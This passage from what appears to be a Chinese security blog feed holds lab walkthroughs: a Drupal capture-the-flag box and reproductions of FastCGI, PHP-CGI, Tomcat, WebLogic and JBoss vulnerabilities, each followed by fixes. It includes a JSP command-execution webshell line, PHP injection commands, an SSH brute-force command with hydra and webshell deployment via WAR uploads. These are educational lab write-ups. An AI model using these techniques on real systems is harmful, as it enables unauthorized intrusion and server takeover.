alt=""></p><p>我们使用Wappalyzer进行网站的指纹识别，得到更详细的信息。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204115356.png" alt=""></p><h4 id="第四步、使用msf入侵目标系统"><a href="#第四步、使用msf入侵目标系统" class="headerlink" title="第四步、使用msf入侵目标系统"></a>第四步、使用msf入侵目标系统</h4><p>进入msf控制台，使用search命令查找关于Drupal的历史漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204104359.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204104445.png" alt=""></p><p>我们选择极好等级的并且日期较近的漏洞进行利用，可以提高成功概率。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204104853.png" alt=""></p><p>我们使用set命令设置目标机器，使用run或exploit命令开始攻击。</p><p>看到出现meterpreter证明成功入侵系统。</p><h4 id="第五步、获取flag-1"><a href="#第五步、获取flag-1" class="headerlink" title="第五步、获取flag 1"></a>第五步、获取flag 1</h4><p>我们执行shell命令获得shell.</p><p>ls后发现目录下存在flag1.txt.</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204105001.png" alt=""></p><p>我们cat flag1.txt读取内容。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204105042.png" alt=""></p><p>翻译：每一个好的CMS都需要一个配置文件，你也一样。</p><h4 id="第六步、获取flag2-txt"><a href="#第六步、获取flag2-txt" class="headerlink" title="第六步、获取flag2.txt"></a>第六步、获取flag2.txt</h4><p>我们通过百度查询到该cms的配置文件 ：/var/www/sites/default</p><p>我们使用cd命令切换到该目录，读取目录下的setting.php文件。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204110426.png" alt=""></p><p>我们找到了flag2.txt并读取内容。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204110442.png" alt=""></p><p>翻译：暴力和字典攻击不是获取访问权限的唯一方式。并且将需要访问权限。并且给出了mysql数据库的账号和密码。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204110617.png" alt=""></p><h4 id="第七步、获取flag4-txt"><a href="#第七步、获取flag4-txt" class="headerlink" title="第七步、获取flag4.txt"></a>第七步、获取flag4.txt</h4><p>我们可以先看一下/etc/passwd中的内容，意外发现了flag4的账号名</p><p>/etc/passwd 储存了用户重要信息，一般可读但不可写</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204115756.png" alt=""></p><p>我们尝试使用john+hydra进行暴力破解。</p><pre><code>hydra -l flag4 -p/Users/john-1.8.0/run/password.lst ssh://192.168.153.150</code></pre><p>-l 指定用户名<br> -P 加载密码字典（这里使用了John the Ripper安装后提供的密码本，一般在john-1.8.0/run/password.lst)<br> ssh://ip 指定使用协议和ip地址</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204120356.png" alt=""></p><p>得到了flag4账号对应的密码为orange</p><p>我们使用kali ssh远程登录 </p><pre><code>ssh flag4@192.168.153.150</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200204120529.png" alt=""></p><p>ls后发现flag4.txt文件，尝试cat读取。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204121509.png" alt=""></p><p>翻译:您可以使用相同的方法在根目录中查找或访问标志吗?可能。但也许不是那么容易。或许是这样？</p><p>可能我们需要提权。</p><h4 id="第八步、获得-thefinalflag-txt"><a href="#第八步、获得-thefinalflag-txt" class="headerlink" title="第八步、获得 thefinalflag.txt"></a>第八步、获得 thefinalflag.txt</h4><p>由flag3.txt可知，我们需要获取root权限才能读取最终的flag</p><p>由于对提取部分知识不够，参考别人的教程要利用suid提权</p><p>suid是Linux的一个权限机制，在执行使用suid权限的文件时候，调用者会暂时有该文件的root权限。</p><p>首先我们使用<code>find / -perm -4000 2&gt;/dev/null</code>发现系统上运行的所有SUID可执行文件。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204122116.png" alt=""></p><p>发现find命令被设置为suid权限位</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204122420.png" alt=""></p><p>之后我们通过find命令提权，使用whoami查看用户权限。</p><p>之后进入 root目录下查看最终的flag.</p><p><strong>完</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>其他中间件漏洞</title>
      <link href="/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="其它中间件相关漏洞"><a href="#其它中间件相关漏洞" class="headerlink" title="其它中间件相关漏洞"></a>其它中间件相关漏洞</h2><h4 id="FastCGI未授权访问、任意命令执行"><a href="#FastCGI未授权访问、任意命令执行" class="headerlink" title="FastCGI未授权访问、任意命令执行"></a>FastCGI未授权访问、任意命令执行</h4><p><strong>1、 漏洞简介及成因</strong></p><p>服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。</p><p><strong>2、 漏洞复现</strong></p><p>使用vulhub实验环境，启动实验环境。</p><p>在攻击机使用命令python fpm.py 192.168.237.136 /etc/passwd，观察返回结果。</p><p><a href="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png!small" alt="img"></a></p><p>由于访问非*.PHP文件，所以返回结果403。</p><p>使用命令执行一个默认存在的 php 文件。</p><pre><code>python fpm.py 192.168.237.136 /usr/local/lib/php/PEAR.php</code></pre><p><a href="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png!small" alt="img"></a></p><p>利用命令进行任意命令执行复现。</p><pre><code>python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `pwd`; ?&gt;&#39;python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ifconfig`; ?&gt;&#39;python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ls`; ?&gt;&#39;</code></pre><p><a href="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png!small" alt="img"></a></p><p><strong>3、 漏洞修复</strong></p><p>更改默认端口</p><h3 id="（二）-PHPCGI远程代码执行"><a href="#（二）-PHPCGI远程代码执行" class="headerlink" title="（二） PHPCGI远程代码执行"></a>（二） PHPCGI远程代码执行</h3><p><strong>1、 漏洞简介及成因</strong></p><p>在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。</p><p>此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。</p><p><strong>2、 漏洞复现</strong></p><p>使用vulhub实验环境，启动环境。</p><p>访问<a href="http://192.168.139.129:8080/index.php。" target="_blank" rel="noopener">http://192.168.139.129:8080/index.php。</a></p><p><a href="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png!small" alt="img"></a></p><p>抓包，修改包。</p><p><a href="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png!small" alt="img"></a></p><p>命令成功执行。</p><p><strong>3、 漏洞修复</strong></p><p>三种方法：</p><p>1）升级php版本；（php-5.3.12以上版本）;</p><p>2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。</p><p>具体做法：</p><p>修改http.conf文件，找到<Directory/>增加以下三行</p><p>RewriteEngine on</p><p>RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]</p><p>RewriteRule ^(.*) $1? [L]</p><p>重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。</p><p>3）打上php补丁。</p><p>补丁下载地址:<a href="https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat中间件漏洞</title>
      <link href="/2020/04/03/tomcat-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/tomcat-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="Tomcat中间件漏洞复现"><a href="#Tomcat中间件漏洞复现" class="headerlink" title="Tomcat中间件漏洞复现"></a>Tomcat中间件漏洞复现</h2><h4 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h4><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p><h4 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p><p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p><h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>配置漏洞，开启put方法可上传文件功能。</p><p>tomcat文件夹下的/conf/web.xml文件插入：</p><pre><code>     &lt;init-param&gt;           &lt;param-name&gt;readonly&lt;/param-name&gt;           &lt;param-value&gt;false&lt;/param-value&gt;     &lt;/init-param&gt;</code></pre><p>重启tomcat服务。</p><p><a href="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png!small" alt="img"></a></p><p>访问127.0.0.1：8080，burp抓包，send to Repeater，将请求方式改为PUT，创建一个122.jsp，并用%20转义空格字符。123.jsp内容为：</p><pre><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%</code></pre><p>返回201，说明创建成功。</p><p><a href="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png!small" alt="img"></a></p><p>访问127.0.0.1：8080/122.jsp?cmd=calc。</p><p>弹出计算器：</p><p><a href="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png!small" alt="img"></a></p><p><strong>3、 漏洞修复</strong></p><p>1）检测当前版本是否在影响范围内，并禁用PUT方法。</p><p>2）更新并升级至最新版。</p><h3 id="（三）war后门文件部署"><a href="#（三）war后门文件部署" class="headerlink" title="（三）war后门文件部署"></a>（三）war后门文件部署</h3><p><strong>1、漏洞简介及成因</strong></p><p>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。</p><p>若后台管理页面存在弱口令，则可以通过爆破获取密码。</p><p><strong>2、漏洞复现</strong></p><p>Tomcat安装目录下conf里的tomcat-users.xml配置如下：</p><p><a href="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png!small" alt="img"></a></p><p>访问后台，登陆：</p><p><a href="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png!small" alt="img"></a></p><p>上传一个war包，里面是jsp后门：</p><p><a href="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png!small" alt="img"></a></p><p>成功上传并解析，打开：</p><p><a href="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png!small" alt="img"></a></p><p>可执行系统命令：</p><p><a href="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png!small" alt="img"></a></p><p>也可进行文件管理，任意查看、删除、上传文件：</p><p><a href="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png!small" alt="img"></a></p><p><strong>3、漏洞修复</strong></p><p>1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p><p>2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。</p><p>3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。</p><p>4）后台管理避免弱口令。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic中间件漏洞</title>
      <link href="/2020/04/03/weblogiic-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/weblogiic-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="WebLogic中间件漏洞复现"><a href="#WebLogic中间件漏洞复现" class="headerlink" title="WebLogic中间件漏洞复现"></a>WebLogic中间件漏洞复现</h2><h4 id="WebLogic简介"><a href="#WebLogic简介" class="headerlink" title="WebLogic简介"></a>WebLogic简介</h4><p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><h5 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1.漏洞原理："></a>1.漏洞原理：</h5><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p><h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>使用vulhub实验环境，启动实验环境，访问靶机，抓包，修改数据包。</p><p><a href="https://image.3001.net/images/20181216/1544955349_5c1625d5f0cfb.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955349_5c1625d5f0cfb.png!small" alt="img"></a></p><p>Kali启动监听。</p><p>发送数据包成功后，拿到shell。</p><p><a href="https://image.3001.net/images/20181216/1544955361_5c1625e14f776.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955361_5c1625e14f776.png!small" alt="img"></a></p><p><strong>3、漏洞修复</strong></p><p>1）升级Oracle 10月份补丁。</p><p>2）对访问wls-wsat的资源进行访问控制。</p><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Weblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><p><strong>2、 漏洞复现</strong></p><p>使用vulhub实验环境，启动环境。</p><p>访问<a href="http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp。" target="_blank" rel="noopener">http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp。</a></p><p><a href="https://image.3001.net/images/20181216/1544955373_5c1625edf3c4f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955373_5c1625edf3c4f.png!small" alt="img"></a></p><p>用burp抓包，修改请求。</p><p><a href="https://image.3001.net/images/20181216/1544955383_5c1625f70b11d.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955383_5c1625f70b11d.png!small" alt="img"></a></p><p>启动nc监听2222端口。</p><p><a href="https://image.3001.net/images/20181216/1544955390_5c1625febc7e3.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955390_5c1625febc7e3.png!small" alt="img"></a></p><p>拿到shell。</p><h5 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h5><p>方法一：</p><p>以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了；</p><p>方法二：</p><p>1）删除uddiexplorer文件夹</p><p>2）限制uddiexplorer应用只能内网访问</p><p>方法三：（常用）</p><p>Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下：</p><p>1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份</p><p>2）将weblogic安装目录下的server/lib/uddiexplorer.war下载</p><p>3）用winrar等工具打开uddiexplorer.war</p><p>4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx</p><p>5）保存后上传回服务端替换原先的uddiexplorer.war</p><p>6）对于多台主机组成的集群，针对每台主机都要做这样的操作</p><p>7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用–停server–停控制台–启控制台–启server–启应用）</p><h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。</p><h5 id="2-漏洞复现-1"><a href="#2-漏洞复现-1" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>访问<a href="http://192.168.139.129:7001/ws_utc/config.do。" target="_blank" rel="noopener">http://192.168.139.129:7001/ws_utc/config.do。</a></p><p><a href="https://image.3001.net/images/20181216/1544955408_5c162610d485e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955408_5c162610d485e.png!small" alt="img"></a></p><p>设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。</p><p>然后点击安全 -&gt; 增加，然后上传 webshell ，这里我上传一个 jsp 大马。</p><p><a href="https://image.3001.net/images/20181216/1544955420_5c16261c14846.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955420_5c16261c14846.png!small" alt="img"></a></p><p>上传后，查看返回的数据包，其中有时间戳：</p><p><a href="https://image.3001.net/images/20181216/1544955428_5c16262471d61.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955428_5c16262471d61.png!small" alt="img"></a></p><p>可以看到时间戳为1543145154632。</p><p>访问<a href="http://192.168.139.129:7001/ws_utc/css/config/keystore/1543145154632_lele.jsp。" target="_blank" rel="noopener">http://192.168.139.129:7001/ws_utc/css/config/keystore/1543145154632_lele.jsp。</a></p><p>可以进行文件管理、文件上传、系统命令执行等。</p><p><a href="https://image.3001.net/images/20181216/1544955438_5c16262ed74a2.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955438_5c16262ed74a2.png!small" alt="img"></a></p><p>尝试以下执行系统命令。</p><p><a href="https://image.3001.net/images/20181216/1544955446_5c16263615970.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955446_5c16263615970.png!small" alt="img"></a></p><p>命令执行成功。</p><p><strong>3.漏洞修复</strong></p><p>方案1：</p><p>使用Oracle官方通告中的补丁链接：</p><p><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></p><p><a href="https://support.oracle.com/rs?type=doc&amp;id=2394520.1" target="_blank" rel="noopener">https://support.oracle.com/rs?type=doc&amp;id=2394520.1</a></p><p>方案2:</p><p>1）进入Weblogic Server管理控制台；</p><p>2）domain设置中，启用”生产模式”。</p><h4 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h4><h5 id="1-漏洞原理：-1"><a href="#1-漏洞原理：-1" class="headerlink" title="1.漏洞原理："></a>1.漏洞原理：</h5><p>由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。</p><h5 id="2-漏洞复现-2"><a href="#2-漏洞复现-2" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>访问<a href="http://192.168.139.129:7001/console" target="_blank" rel="noopener">http://192.168.139.129:7001/console</a></p><p><a href="https://image.3001.net/images/20181216/1544955458_5c162642c59ac.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955458_5c162642c59ac.png!small" alt="img"></a></p><p>使用弱口令登陆至后台。</p><p>点击锁定并编辑。</p><p><a href="https://image.3001.net/images/20181216/1544955467_5c16264b0e5ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955467_5c16264b0e5ed.png!small" alt="img"></a></p><p>选择部署，进一步点击右边的安装。</p><p><a href="https://image.3001.net/images/20181216/1544955476_5c162654ad096.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955476_5c162654ad096.png!small" alt="img"></a></p><p>点击上传文件 — 进入文件上传界面，选择要上传的 war 包。</p><p><a href="https://image.3001.net/images/20181216/1544955485_5c16265d47acf.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955485_5c16265d47acf.png!small" alt="img"></a></p><p>进入下一步，选择对应的 war 包进行部署，下一步下一步直至完成。</p><p><a href="https://image.3001.net/images/20181216/1544955495_5c16266778cf9.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955495_5c16266778cf9.png!small" alt="img"></a></p><p><a href="https://image.3001.net/images/20181216/1544955518_5c16267e4cdda.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955518_5c16267e4cdda.png!small" alt="img"></a></p><p><a href="https://image.3001.net/images/20181216/1544955523_5c1626831e3b3.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955523_5c1626831e3b3.png!small" alt="img"></a></p><p>点击激活更改。</p><p><a href="https://image.3001.net/images/20181216/1544955531_5c16268b6846b.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955531_5c16268b6846b.png!small" alt="img"></a></p><p>启动上传的 war 包所生成的服务。</p><p><a href="https://image.3001.net/images/20181216/1544955539_5c16269393d67.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955539_5c16269393d67.png!small" alt="img"></a></p><p>拿到 webshell。</p><p><a href="https://image.3001.net/images/20181216/1544955547_5c16269badc78.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955547_5c16269badc78.png!small" alt="img"></a></p><p><strong>3、 漏洞修复</strong></p><p>防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jBoss中间件漏洞</title>
      <link href="/2020/04/03/jboss-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/jboss-zhong-jian-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="jBoss中间件漏洞复现"><a href="#jBoss中间件漏洞复现" class="headerlink" title="jBoss中间件漏洞复现"></a>jBoss中间件漏洞复现</h2><h4 id="jBoss简介"><a href="#jBoss简介" class="headerlink" title="jBoss简介"></a>jBoss简介</h4><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p><h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p><p><strong>2、 漏洞复现</strong></p><p>靶机启动jboss。</p><p>攻击机访问靶机服务：</p><p><a href="https://image.3001.net/images/20181216/1544955201_5c16254132af8.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955201_5c16254132af8.png!small" alt="img"></a></p><p>访问/invoker/readonly。</p><p>返回500，说明页面存在，此页面有反序列化漏洞：</p><p><a href="https://image.3001.net/images/20181216/1544955212_5c16254c54a5e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955212_5c16254c54a5e.png!small" alt="img"></a></p><p>抓包：</p><p><a href="https://image.3001.net/images/20181216/1544955225_5c162559c837c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955225_5c162559c837c.png!small" alt="img"></a></p><p>改包。</p><p>POST payload.bin中数据。</p><p><a href="https://image.3001.net/images/20181216/1544955253_5c162575ce0a6.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955253_5c162575ce0a6.png!small" alt="img"></a></p><p><a href="https://image.3001.net/images/20181216/1544955240_5c162568b8024.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955240_5c162568b8024.png!small" alt="img"></a></p><p>查看靶机，弹出计算器。</p><p><a href="https://image.3001.net/images/20181216/1544955250_5c1625722d41e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955250_5c1625722d41e.png!small" alt="img"></a></p><p><strong>3、 漏洞修复</strong></p><p>有效解决方案：升级到JBOSS AS7版本临时解决方案：</p><p>1）不需要http-invoker.sar 组件的用户可直接删除此组件；</p><p>2）用于对 httpinvoker 组件进行访问控制。</p><h4 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h4><h5 id="1-漏洞原理-1"><a href="#1-漏洞原理-1" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。</p><p><strong>2、 漏洞复现</strong></p><p><a href="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png!small" alt="img"></a></p><p><a href="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png!small" alt="img"></a></p><p>点击Web Application(war)s。</p><p><a href="https://image.3001.net/images/20181216/1544955283_5c16259340980.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955283_5c16259340980.png!small" alt="img"></a></p><p>点击add a new resource。</p><p><a href="https://image.3001.net/images/20181216/1544955291_5c16259b4b362.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955291_5c16259b4b362.png!small" alt="img"></a></p><p>选择一个war包上传，上传后，进入该war包，点击start。</p><p><a href="https://image.3001.net/images/20181216/1544955300_5c1625a46f26a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955300_5c1625a46f26a.png!small" alt="img"></a></p><p>查看status为sucessful。</p><p><a href="https://image.3001.net/images/20181216/1544955310_5c1625ae165ad.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955310_5c1625ae165ad.png!small" alt="img"></a></p><p>访问该war包页面，进入后门。</p><p>可进行文件管理和系统命令执行。</p><p><a href="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png!small" alt="img"></a></p><p><a href="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png!small" alt="img"></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nginx中间件漏洞</title>
      <link href="/2020/04/03/nginx-zhong-jian-jian-lou-dong/"/>
      <url>/2020/04/03/nginx-zhong-jian-jian-lou-dong/</url>
      
